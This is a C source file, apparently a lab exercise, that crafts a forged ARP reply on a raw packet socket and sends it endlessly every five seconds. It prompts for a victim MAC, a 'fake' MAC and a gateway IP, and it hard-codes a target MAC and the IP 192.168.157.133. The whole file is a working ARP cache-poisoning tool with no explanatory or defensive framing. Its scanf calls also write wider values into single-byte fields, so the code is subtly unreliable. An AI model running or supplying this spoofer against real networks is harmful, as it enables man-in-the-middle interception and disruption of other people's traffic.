#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <netdb.h>
#include <string.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <time.h>

typedef struct ETHERNET_HEADER
{
	unsigned char dst[6];
	unsigned char src[6];
	unsigned short type;
}ethernet_header;

typedef struct ARP_HEADER
{
	unsigned short hard_type;
	unsigned short proto_type;
	unsigned char hard_size;
	unsigned char proto_size;
	unsigned short opcode;
	unsigned char sender_mac[6];
	unsigned char sender_ip[4];
	unsigned char target_mac[6];
	unsigned char target_ip[4];
}arp_header;

int main(void)
{
	struct ifreq if_idx;
	struct sockaddr_ll socket_addr;
	memset(&socket_addr, 0, sizeof(struct sockaddr_ll));
	int socket1;
	unsigned char arp_packet[1000];
	memset(arp_packet,0,1000);
	ethernet_header * ethdr=NULL;
	arp_header * arphdr=NULL;

	socket1 = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	
	strncpy(if_idx.ifr_ifrn.ifrn_name, "eth0", IFNAMSIZ);
	ioctl(socket1, SIOCGIFINDEX, &if_idx);
	
	socket_addr.sll_family = PF_PACKET;
	socket_addr.sll_ifindex = if_idx.ifr_ifru.ifru_ivalue;
	
	ethdr = (ethernet_header *)arp_packet;	
	
	printf("Target MAC Address : ");
	
	scanf("%x:%x:%x:%x:%x:%x", &ethdr->dst[0], &ethdr->dst[1], &ethdr->dst[2], &ethdr->dst[3], &ethdr->dst[4], &ethdr->dst[5]);
	
	ethdr->src[0]=0x00;
	ethdr->src[1]=0x0c;
	ethdr->src[2]=0x29;
	ethdr->src[3]=0x43;
	ethdr->src[4]=0xf6;
	ethdr->src[5]=0x06;
	
	ethdr->type=0x0608;
	
	arphdr = (arp_header *)&arp_packet[sizeof(ethernet_header)];

	printf("Fake MAC Address : ");
	scanf("%x:%x:%x:%x:%x:%x", &arphdr->sender_mac[0], &arphdr->sender_mac[1], &arphdr->sender_mac[2], &arphdr->sender_mac[3], &arphdr->sender_mac[4], &arphdr->sender_mac[5]);

	printf("Gateway IP : ");
	scanf("%d.%d.%d.%d", &arphdr->sender_ip[0], &arphdr->sender_ip[1], &arphdr->sender_ip[2], &arphdr->sender_ip[3]);

	arphdr->hard_type=htons(0x0001);

	arphdr->proto_type=htons(0x0800);

	arphdr->hard_size=0x06;

	arphdr->proto_size=0x04;

	arphdr->opcode=htons(0x0002);

	arphdr->target_mac[0] = 0x00;
	arphdr->target_mac[1] = 0x0c;
	arphdr->target_mac[2] = 0x29;
	arphdr->target_mac[3] = 0x82;
	arphdr->target_mac[4] = 0x7a;
	arphdr->target_mac[5] = 0x94;

	arphdr->target_ip[0] = 192;
	arphdr->target_ip[1] = 168;
	arphdr->target_ip[2] = 157;
	arphdr->target_ip[3] = 133;
	
	socket_addr.sll_addr[0] = ethdr->dst[0];
	socket_addr.sll_addr[1] = ethdr->dst[1];
	socket_addr.sll_addr[2] = ethdr->dst[2];
	socket_addr.sll_addr[3] = ethdr->dst[3];
	socket_addr.sll_addr[4] = ethdr->dst[4];	
	socket_addr.sll_addr[5] = ethdr->dst[5];
	
	

	while(1)
	{	
		sendto(socket1, arp_packet, 42, 0, (struct sockaddr *)&socket_addr, sizeof(socket_addr));
		sleep(5);	
	}
}
